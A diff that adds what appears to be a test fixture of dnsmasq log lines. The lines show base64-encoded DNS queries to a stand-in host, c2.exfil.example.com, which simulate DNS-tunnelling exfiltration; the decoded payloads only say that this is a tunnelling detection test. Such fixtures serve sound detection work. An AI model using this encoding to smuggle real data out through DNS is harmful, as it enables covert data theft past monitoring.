@@ -1,0 +1,12 @@
+dnsmasq[99]: query[A] aGVsbG8gd29ybGQgZm9vYmFy.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] dGhpcyBpcyBhIHRlc3Qgc3Ry.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] aW5nIGZvciBkbnMgdHVubmVs.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] aW5nIGRldGVjdGlvbiB0ZXN0.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] ZXh0cmFjaGFyc2ZvcnRlc3Qx.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] ZXh0cmFjaGFyc2ZvcnRlc3Qy.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] ZXh0cmFjaGFyc2ZvcnRlc3Qz.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] ZXh0cmFjaGFyc2ZvcnRlc3Q0.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] ZXh0cmFjaGFyc2ZvcnRlc3Q1.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] ZXh0cmFjaGFyc2ZvcnRlc3Q2.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] ZXh0cmFjaGFyc2ZvcnRlc3Q3.c2.exfil.example.com from 127.0.0.1
+dnsmasq[99]: query[A] ZXh0cmFjaGFyc2ZvcnRlc3Q4.c2.exfil.example.com from 127.0.0.1
